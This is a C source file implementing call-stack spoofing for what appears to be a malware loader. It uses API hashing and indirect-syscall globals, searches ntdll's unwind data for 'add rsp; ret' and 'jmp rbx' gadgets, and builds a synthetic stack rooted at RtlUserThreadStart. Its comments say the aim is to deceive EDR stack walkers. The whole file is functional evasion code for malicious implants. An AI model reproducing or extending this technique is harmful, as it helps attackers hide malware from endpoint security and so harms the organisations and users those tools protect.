#include "StackSpoof.h"
#include "Common.h"
#include "ApiHashing.h"
#include "../Engine/NtApi.h"

/* Declared in HellsHall.asm— used in Init */
extern ULONG64 g_SpoofSavedRsp;
extern ULONG64 g_SpoofSyntheticStack[32];
extern DWORD   g_SpoofEnabled;

typedef struct {
    PVOID  addr;        /* address of gadget in .text ntdll */
    DWORD  stackDelta;  /* sum of delta from UNWIND_INFO (in bytes) */
} SPOOF_GADGET;

static SPOOF_GADGET g_AddRspGadget = { 0 };
static SPOOF_GADGET g_JmpRbxGadget = { 0 };
static PVOID        g_RtlThreadStart = NULL;

/* Parses UNWIND_INFO and computes RSP deltas for the prologue.
 * Returns TRUE on clean parse. Output:
 *   pAllocDelta = sum of UWOP_ALLOC_SMALL/LARGE (matches `add rsp, imm` epilogue)
 *   pTotalDelta = alloc + 8*pushes (full stack frame size)
 * Advancing `i` correctly for every opcode prevents desync when the array
 * contains SAVE_NONVOL / XMM128 / MACHFRAME entries. */
static BOOL ParseUnwind(PBYTE pBase, DWORD unwindInfoRva, DWORD* pAllocDelta, DWORD* pTotalDelta) {
    PBYTE pUI = pBase + unwindInfoRva;
    BYTE  countOfCodes = pUI[2];
    DWORD allocDelta = 0, totalDelta = 0;
    for (BYTE i = 0; i < countOfCodes; ) {
        BYTE opcode = pUI[4 + i * 2 + 1] & 0x0F;
        BYTE opinfo = (pUI[4 + i * 2 + 1] >> 4) & 0x0F;
        switch (opcode) {
        case 0: /* UWOP_PUSH_NONVOL */ totalDelta += 8; i += 1; break;
        case 1: /* UWOP_ALLOC_LARGE */
            if (opinfo == 0) {
                DWORD sz = *(WORD*)(pUI + 4 + (i + 1) * 2) * 8;
                allocDelta += sz; totalDelta += sz; i += 2;
            } else {
                DWORD sz = *(DWORD*)(pUI + 4 + (i + 1) * 2);
                allocDelta += sz; totalDelta += sz; i += 3;
            }
            break;
        case 2: /* UWOP_ALLOC_SMALL */ {
            DWORD sz = (DWORD)(opinfo * 8 + 8);
            allocDelta += sz; totalDelta += sz; i += 1;
        } break;
        case 3: /* UWOP_SET_FPREG        */ i += 1; break;
        case 4: /* UWOP_SAVE_NONVOL      */ i += 2; break;
        case 5: /* UWOP_SAVE_NONVOL_FAR  */ i += 3; break;
        case 8: /* UWOP_SAVE_XMM128      */ i += 2; break;
        case 9: /* UWOP_SAVE_XMM128_FAR  */ i += 3; break;
        case 10:/* UWOP_PUSH_MACHFRAME   */ i += 1; break;
        default: i += 1; break;
        }
    }
    *pAllocDelta = allocDelta;
    *pTotalDelta = totalDelta;
    return TRUE;
}

/* Searches for the "add rsp, X; ret" gadget in .text ntdll with a matching delta from UNWIND_INFO. */
static BOOL FindAddRspGadget(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY pdataDir = pNt->OptionalHeader.DataDirectory[3]; /* IMAGE_DIRECTORY_ENTRY_EXCEPTION */
    if (!pdataDir.VirtualAddress || !pdataDir.Size) return FALSE;

    PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(pBase + pdataDir.VirtualAddress);
    DWORD count = pdataDir.Size / sizeof(RUNTIME_FUNCTION);

    for (DWORD i = 0; i < count; i++) {
        DWORD funcSize = pRF[i].EndAddress - pRF[i].BeginAddress;
        if (funcSize < 5 || funcSize > 256) continue;

        if (pRF[i].UnwindData & 1) continue;
        DWORD allocDelta = 0, totalDelta = 0;
        if (!ParseUnwind(pBase, pRF[i].UnwindData, &allocDelta, &totalDelta)) continue;
        /* `add rsp, imm8` only reverses the SUB portion — imm8 must equal the
         * pure alloc delta, not the full stack frame (which also counts pushes).
         *
         * Extra constraint: delta must be < 0x20.  The synthetic stack reserves
         * slots [5..10] (offsets 0x28..0x50) for forwarded stack args; the
         * jmpRbx gadget sits at offset (8 + delta) after trampoline ret pops
         * gadget1.  For delta < 0x20, gadget2 lands at offset <= 0x20, safely
         * before the arg zone.  Larger deltas would either collide with an
         * arg slot or place gadget2 beyond it (breaking the chain). */
        if (allocDelta == 0 || allocDelta >= 0x20 || (allocDelta & 7)) continue;

        PBYTE pFunc = pBase + pRF[i].BeginAddress;
        for (DWORD j = 0; j + 4 < funcSize; j++) {
            if (pFunc[j] == 0x48 && pFunc[j + 1] == 0x83 &&
                pFunc[j + 2] == 0xC4 && pFunc[j + 3] == (BYTE)allocDelta &&
                pFunc[j + 4] == 0xC3) {
                g_AddRspGadget.addr = pFunc + j;
                g_AddRspGadget.stackDelta = allocDelta;
                return TRUE;
            }
        }
    }
    return FALSE;
}

/* Searches for "jmp rbx" (FF E3) in every MEM_EXECUTE section of ntdll.
 * Name-based matching proved unreliable on some Windows 11 builds — instead
 * scan all sections flagged executable via the Characteristics field.
 * Jumping into the middle of a larger instruction is fine: the CPU fetches
 * "FF E3" at the gadget address and executes jmp rbx regardless of the
 * preceding byte, so no REX-prefix exclusion is needed.
 *
 * The gadget MUST sit inside a RUNTIME_FUNCTION whose UNWIND_INFO parses
 * cleanly: EDR's stack walker uses that frame size to locate the next
 * return slot (where we plant RtlUserThreadStart) on the synthetic stack.
 * A "raw" gadget without a matching RUNTIME_FUNCTION would break the
 * EDR-visible chain. */
static BOOL FindJmpRbxGadget(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY pdataDir = pNt->OptionalHeader.DataDirectory[3];
    PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(pBase + pdataDir.VirtualAddress);
    DWORD rfCount = pdataDir.Size / sizeof(RUNTIME_FUNCTION);

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int s = 0; s < pNt->FileHeader.NumberOfSections; s++, pSec++) {
        if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        PBYTE pSecData = pBase + pSec->VirtualAddress;
        DWORD secSize = pSec->Misc.VirtualSize;

        for (DWORD j = 0; j + 1 < secSize; j++) {
            if (pSecData[j] != 0xFF || pSecData[j + 1] != 0xE3) continue;

            DWORD rva = (DWORD)((pSecData + j) - pBase);
            for (DWORD k = 0; k < rfCount; k++) {
                if (rva >= pRF[k].BeginAddress && rva < pRF[k].EndAddress) {
                    if (pRF[k].UnwindData & 1) break;
                    DWORD allocDelta = 0, totalDelta = 0;
                    ParseUnwind(pBase, pRF[k].UnwindData, &allocDelta, &totalDelta);
                    g_JmpRbxGadget.addr = pSecData + j;
                    g_JmpRbxGadget.stackDelta = allocDelta;
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

/* Identifies which init step failed; caller maps it to a distinct exit code. */
DWORD g_SpoofInitFailStep = 0;

BOOL StackSpoof_Init(void) {
    g_SpoofInitFailStep = 0;
    PBYTE pNtdll = (PBYTE)GetModuleHandleH(g_Hash_ntdll);
    if (!pNtdll)                    { g_SpoofInitFailStep = 1; return FALSE; }
    if (!FindAddRspGadget(pNtdll))  { g_SpoofInitFailStep = 2; return FALSE; }
    if (!FindJmpRbxGadget(pNtdll))  { g_SpoofInitFailStep = 3; return FALSE; }

    /* RtlUserThreadStart — search via GetProcAddressH */
    HMODULE hNtdll = (HMODULE)pNtdll;
    g_RtlThreadStart = (PVOID)GetProcAddressH(hNtdll, Djb2HashA("RtlUserThreadStart"));
    if (!g_RtlThreadStart) { g_SpoofInitFailStep = 4; return FALSE; }

    /* Build synthetic stack — layout described in the plan.
     * Array indices (QWORD): */
    DWORD d1 = g_AddRspGadget.stackDelta;   /* delta of gadget 1 */
    DWORD d2 = g_JmpRbxGadget.stackDelta;   /* delta of gadget 2 */

    /* [0] = gadget_1 (add rsp, d1; ret)                         */
    g_SpoofSyntheticStack[0] = (ULONG64)g_AddRspGadget.addr;
    /* [1..d1/8] = padding (zero)                                */
    /* [(d1/8)+1] = gadget_2 (jmp rbx)                           */
    g_SpoofSyntheticStack[(d1 / 8) + 1] = (ULONG64)g_JmpRbxGadget.addr;
    /* [(d1/8)+1+(d2/8)+1] = RtlUserThreadStart (EDR root)       */
    g_SpoofSyntheticStack[(d1 / 8) + (d2 / 8) + 2] = (ULONG64)g_RtlThreadStart;

    g_SpoofEnabled = 1;
    return TRUE;
}

void StackSpoof_Cleanup(void) {
    g_SpoofEnabled = 0;
}